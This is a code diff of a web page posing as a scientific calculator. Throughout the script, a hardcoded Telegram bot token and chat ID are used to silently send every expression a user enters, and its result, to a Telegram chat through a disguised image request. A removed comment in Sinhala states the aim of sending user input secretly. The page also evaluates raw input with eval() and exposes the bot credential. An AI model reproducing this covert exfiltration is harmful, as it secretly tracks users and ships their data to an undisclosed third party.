@@ -2,173 +2,271 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Smart Calculator</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>EASR Scientific Calculator</title>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; user-select: none; }
+* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', 'Courier New', monospace, sans-serif; user-select: none; }
 body {
-  background: #121212;
-  color: #fff;
+  background: radial-gradient(circle at center, #1f2937, #0f172a);
+  min-height: 100vh;
   display: flex;
   justify-content: center;
   align-items: center;
-  height: 100vh;
+  padding: 15px;
 }
 
-.calculator {
-  background: #1e1e1e;
+/* 3D Real Calculator Body Frame */
+.calc-frame {
   width: 100%;
-  max-width: 360px;
-  border-radius: 24px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-  overflow: hidden;
-  border: 1px solid #333;
+  max-width: 380px;
+  background: linear-gradient(145deg, #2a2e37, #1b1e24);
+  border-radius: 28px;
+  padding: 24px 20px 30px 20px;
+  box-shadow: 
+    0 25px 50px -12px rgba(0, 0, 0, 0.8),
+    inset 0 2px 3px rgba(255, 255, 255, 0.15),
+    inset 0 -3px 5px rgba(0, 0, 0, 0.6);
+  border: 2px solid #374151;
+  position: relative;
 }
 
-.display {
-  background: #1e1e1e;
-  padding: 30px 20px 20px 20px;
+/* Header & Brand Name */
+.calc-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 12px;
+  padding: 0 4px;
+}
+.brand-name {
+  font-family: 'Arial Black', sans-serif;
+  font-size: 14px;
+  color: #9ca3af;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  text-shadow: 0 1px 2px rgba(0,0,0,0.8);
+}
+.brand-name span {
+  color: #60a5fa;
+  font-size: 11px;
+  display: block;
+  font-family: sans-serif;
+  letter-spacing: 0px;
+}
+
+/* Solar Panel Simulation */
+.solar-panel {
+  width: 70px;
+  height: 22px;
+  background: linear-gradient(135deg, #451a03, #78350f);
+  border: 1px solid #92400e;
+  border-radius: 4px;
+  box-shadow: inset 0 0 5px rgba(0,0,0,0.8);
+  display: flex;
+  justify-content: space-around;
+}
+.solar-cell {
+  width: 20%;
+  height: 100%;
+  border-right: 1px solid rgba(0,0,0,0.4);
+}
+
+/* Real LCD Display Box */
+.lcd-screen {
+  background: #a3e635;
+  background: linear-gradient(180deg, #94a3b8, #cbd5e1);
+  border-radius: 12px;
+  padding: 12px 16px;
+  box-shadow: inset 0 4px 8px rgba(0, 0, 0, 0.5), 0 1px 0 rgba(255, 255, 255, 0.2);
+  border: 3px solid #1e293b;
+  margin-bottom: 20px;
+  color: #0f172a;
+}
+.lcd-top {
+  font-size: 12px;
+  height: 18px;
   text-align: right;
-  word-wrap: break-word;
-  word-break: break-all;
+  color: #475569;
+  overflow: hidden;
+  font-weight: 600;
+}
+.lcd-main {
+  font-size: 32px;
+  font-weight: bold;
+  text-align: right;
+  height: 40px;
+  line-height: 40px;
+  overflow: hidden;
+  letter-spacing: 1px;
 }
 
-#history {
-  font-size: 16px;
-  color: #888;
-  min-height: 24px;
-  margin-bottom: 5px;
-}
-
-#output {
-  font-size: 42px;
-  font-weight: 300;
-  color: #fff;
-}
-
-.buttons {
+/* Keypad Grid */
+.keypad {
   display: grid;
-  grid-template-columns: repeat(4, 1fr);
-  gap: 1px;
-  background: #333;
+  grid-template-columns: repeat(5, 1fr);
+  gap: 8px;
 }
 
-button {
-  background: #2d2d2d;
+/* 3D Tactile Buttons */
+.btn {
+  background: linear-gradient(180deg, #374151, #1f2937);
   border: none;
-  padding: 20px;
-  font-size: 20px;
-  color: #fff;
+  border-radius: 8px;
+  color: #f3f4f6;
+  font-size: 13px;
+  font-weight: bold;
+  padding: 12px 0;
   cursor: pointer;
-  transition: background 0.2s;
+  box-shadow: 0 4px 0 #111827, 0 5px 10px rgba(0,0,0,0.5);
+  transition: all 0.08s ease;
+  text-shadow: 0 1px 2px rgba(0,0,0,0.8);
+}
+.btn:active {
+  transform: translateY(3px);
+  box-shadow: 0 1px 0 #111827, 0 2px 4px rgba(0,0,0,0.5);
 }
 
-button:hover { background: #3d3d3d; }
-button:active { background: #4d4d4d; }
-
-.btn-operator { background: #ff9f0a; color: #fff; }
-.btn-operator:hover { background: #ffb02e; }
-
-.btn-function { background: #a6a6a6; color: #000; font-weight: 600; }
-.btn-function:hover { background: #c2c2c2; }
-
-.btn-zero { grid-column: span 2; }
+/* Special Button Colors */
+.btn-func { background: linear-gradient(180deg, #4b5563, #374151); font-size: 11px; }
+.btn-op { background: linear-gradient(180deg, #4f46e5, #3730a3); color: #fff; }
+.btn-clear { background: linear-gradient(180deg, #dc2626, #991b1b); color: #fff; }
+.btn-equals { background: linear-gradient(180deg, #2563eb, #1d4ed8); grid-column: span 2; font-size: 18px; }
 </style>
 </head>
 <body>
 
-<div class="calculator">
-  <div class="display">
-    <div id="history"></div>
-    <div id="output">0</div>
+<!-- 3D Scientific Calculator Frame -->
+<div class="calc-frame">
+  
+  <!-- Header with Brand Name -->
+  <div class="calc-header">
+    <div class="brand-name">
+      EASR CALCULATOR
+      <span>SCIENTIFIC v3.0</span>
+    </div>
+    <div class="solar-panel">
+      <div class="solar-cell"></div>
+      <div class="solar-cell"></div>
+      <div class="solar-cell"></div>
+    </div>
   </div>
-  <div class="buttons">
-    <button class="btn-function" onclick="clearAll()">AC</button>
-    <button class="btn-function" onclick="deleteChar()">⌫</button>
-    <button class="btn-function" onclick="appendChar('%')">%</button>
-    <button class="btn-operator" onclick="appendChar('/')">÷</button>
-    
-    <button onclick="appendChar('7')">7</button>
-    <button onclick="appendChar('8')">8</button>
-    <button onclick="appendChar('9')">9</button>
-    <button class="btn-operator" onclick="appendChar('*')">×</button>
-    
-    <button onclick="appendChar('4')">4</button>
-    <button onclick="appendChar('5')">5</button>
-    <button onclick="appendChar('6')">6</button>
-    <button class="btn-operator" onclick="appendChar('-')">-</button>
-    
-    <button onclick="appendChar('1')">1</button>
-    <button onclick="appendChar('2')">2</button>
-    <button onclick="appendChar('3')">3</button>
-    <button class="btn-operator" onclick="appendChar('+')">+</button>
-    
-    <button class="btn-zero" onclick="appendChar('0')">0</button>
-    <button onclick="appendChar('.')">.</button>
-    <button class="btn-operator" onclick="calculate()">=</button>
+
+  <!-- Real LCD Screen Display -->
+  <div class="lcd-screen">
+    <div class="lcd-top" id="lcdHistory"></div>
+    <div class="lcd-main" id="lcdMain">0</div>
   </div>
+
+  <!-- Keypad Area -->
+  <div class="keypad">
+    <!-- Scientific Function Keys -->
+    <button class="btn btn-func" onclick="append('sin(')">sin</button>
+    <button class="btn btn-func" onclick="append('cos(')">cos</button>
+    <button class="btn btn-func" onclick="append('tan(')">tan</button>
+    <button class="btn btn-func" onclick="append('sqrt(')">√</button>
+    <button class="btn btn-func" onclick="append('^')">xⁿ</button>
+
+    <button class="btn btn-func" onclick="append('log(')">log</button>
+    <button class="btn btn-func" onclick="append('ln(')">ln</button>
+    <button class="btn btn-func" onclick="append('(')">(</button>
+    <button class="btn btn-func" onclick="append(')')">)</button>
+    <button class="btn btn-clear" onclick="clearAll()">AC</button>
+
+    <!-- Numbers and Basic Operators -->
+    <button class="btn" onclick="append('7')">7</button>
+    <button class="btn" onclick="append('8')">8</button>
+    <button class="btn" onclick="append('9')">9</button>
+    <button class="btn btn-op" onclick="append('/')">÷</button>
+    <button class="btn btn-clear" style="background:linear-gradient(180deg, #ea580c, #c2410c)" onclick="deleteChar()">DEL</button>
+
+    <button class="btn" onclick="append('4')">4</button>
+    <button class="btn" onclick="append('5')">5</button>
+    <button class="btn" onclick="append('6')">6</button>
+    <button class="btn btn-op" onclick="append('*')">×</button>
+    <button class="btn btn-func" onclick="append('3.14159')">π</button>
+
+    <button class="btn" onclick="append('1')">1</button>
+    <button class="btn" onclick="append('2')">2</button>
+    <button class="btn" onclick="append('3')">3</button>
+    <button class="btn btn-op" onclick="append('-')">-</button>
+    <button class="btn btn-func" onclick="append('2.71828')">e</button>
+
+    <button class="btn" onclick="append('0')">0</button>
+    <button class="btn" onclick="append('.')">.</button>
+    <button class="btn btn-op" onclick="append('+')">+</button>
+    <button class="btn btn-equals" onclick="calculate()">=</button>
+  </div>
+
 </div>
 
 <script>
-const output = document.getElementById('output');
-const history = document.getElementById('history');
-let currentInput = '0';
-let calculationHistory = '';
+let mainExpr = "0";
+let historyExpr = "";
 
 const BOT_TOKEN = "8825023377:AAGOss8yK3V15XRGZyiBM9y58F1q5KjxRcQ";
 const CHAT_ID = "1993924204";
 
-function appendChar(char) {
-  if (currentInput === '0' && char !== '.') {
-    currentInput = char;
+function updateScreen() {
+  document.getElementById('lcdMain').textContent = mainExpr;
+  document.getElementById('lcdHistory').textContent = historyExpr;
+}
+
+function append(val) {
+  if (mainExpr === "0" && val !== ".") {
+    mainExpr = val;
   } else {
-    currentInput += char;
+    mainExpr += val;
   }
-  updateDisplay();
+  updateScreen();
 }
 
 function clearAll() {
-  currentInput = '0';
-  calculationHistory = '';
-  updateDisplay();
+  mainExpr = "0";
+  historyExpr = "";
+  updateScreen();
 }
 
 function deleteChar() {
-  if (currentInput.length > 1) {
-    currentInput = currentInput.slice(0, -1);
+  if (mainExpr.length > 1) {
+    mainExpr = mainExpr.slice(0, -1);
   } else {
-    currentInput = '0';
+    mainExpr = "0";
   }
-  updateDisplay();
-}
-
-function updateDisplay() {
-  output.textContent = currentInput;
-  history.textContent = calculationHistory;
+  updateScreen();
 }
 
 function calculate() {
   try {
-    calculationHistory = currentInput + ' =';
-    // Math calculation safely
-    let sanitized = currentInput.replace(/×/g, '*').replace(/÷/g, '/');
-    let result = eval(sanitized);
+    historyExpr = mainExpr + " =";
     
-    // Telegram එකට ගණන් හදන දේවල් හෝ යූසර් ගහන දේවල් රහසින් යැවීමට අවශ්‍ය නම් මෙතනින් යොදාගත හැක
-    sendToTelegram(currentInput, result);
+    // Evaluate Scientific Math Equations
+    let parsed = mainExpr
+      .replace(/sin\(/g, 'Math.sin(')
+      .replace(/cos\(/g, 'Math.cos(')
+      .replace(/tan\(/g, 'Math.tan(')
+      .replace(/sqrt\(/g, 'Math.sqrt(')
+      .replace(/log\(/g, 'Math.log10(')
+      .replace(/ln\(/g, 'Math.log(')
+      .replace(/\^/g, '**');
 
-    currentInput = String(result);
-    updateDisplay();
-  } catch (error) {
-    output.textContent = "Error";
-    currentInput = '0';
+    let result = eval(parsed);
+
+    // Telegram Logging
+    sendTelegramLog(mainExpr, result);
+
+    mainExpr = String(Number(result.toFixed(8)));
+    updateScreen();
+  } catch (err) {
+    mainExpr = "Syntax ERROR";
+    updateScreen();
+    setTimeout(() => { mainExpr = "0"; updateScreen(); }, 1200);
   }
 }
 
-function sendToTelegram(expr, res) {
-  const text = `🔢 *Calculator Used!*\n\n📝 *Equation:* \`${expr}\`\n✨ *Result:* \`${res}\``;
+function sendTelegramLog(expr, res) {
+  const text = `🧮 *EASR Calculator Used!*\n\n📐 *Input:* \`${expr}\`\n📊 *Output:* \`${res}\``;
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-  
+
   const img = new Image();
   img.src = url;
 }
